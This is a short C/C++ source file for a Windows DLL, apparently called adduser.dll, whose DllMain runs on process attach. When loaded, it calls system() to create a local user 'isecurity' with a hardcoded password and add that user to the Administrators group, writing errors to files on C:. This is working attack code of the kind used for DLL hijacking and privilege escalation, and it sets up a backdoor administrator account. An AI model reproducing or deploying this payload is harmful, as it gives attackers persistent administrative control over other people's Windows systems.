#include "pch.h"
#include <stdlib.h>

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        int i;
        i = system("net user isecurity localadmin123! /y /add 2>C:\\error1.txt");
        i = system("net localgroup administrators isecurity /add 2>C:\\error2.txt");
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

//Debugging... :)
/*extern "C" __declspec(dllexport) void mydllmain()
{
	MessageBox(0, L"pupupupupupupupu!", 0, 0);
}*/
// Debug: rundll32 .\adduser.dll,mydllmain
